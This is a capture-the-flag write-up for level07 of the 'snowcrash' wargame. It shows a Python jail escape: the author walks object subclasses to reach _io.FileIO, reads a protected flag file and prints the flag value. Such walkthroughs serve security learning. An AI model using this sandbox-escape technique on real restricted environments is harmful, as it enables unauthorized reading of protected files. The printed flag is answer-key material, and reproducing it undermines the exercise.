In this level we are in a fake shell simulated in python.
We can see for example in the env : `SHELL=/opt/snowcrash/level07/jail.py`.

We can also see that when doing for emample a mathematical operation in the temrinal :

```
level07@snowcrash:~$ 1+1
2
```

We can also create variables or the print function:
```
level07@snowcrash:~$ var = 1
level07@snowcrash:~$ print("var")
1

```


We are in a python environnement but we do not have access to all python functions such as `open` that'll allow us to directly read the file.

But we still have access to some bases classes of python that we can list with this :

`().__class__.__base__.__subclasses__()`

of this to see the index :

`[(i, x.__name__) for i, x in enumerate(().__class__.__base__.__subclasses__())]`

In all these classes there is one that can be useful : `_IOBase`

The class containes the function allowing us to open and read a file.

The class is not directly usable but we can list all of its subclasses and their own sublasses like this:
`[(x.__module__, x.__name__, x.__subclasses__()) for x in ().__class__.__base__.__subclasses__()[129].__subclasses__()]`

And this way we can see that `_RawIOBase` contains `_io.FileIO`, the class allowing us to read a file.

We can so create an instance of FileIO like this : `F = ().__class__.__base__.__subclasses__()[129].__subclasses__()[2].__subclasses__()[0]`

And now that we have FileIO we can open the flag file : `file = F("/home/flag07/.flag", "r")`
and simply read it:
```
file.read()
b'fiumuikeil8rung8ahcuiperb\n'
```
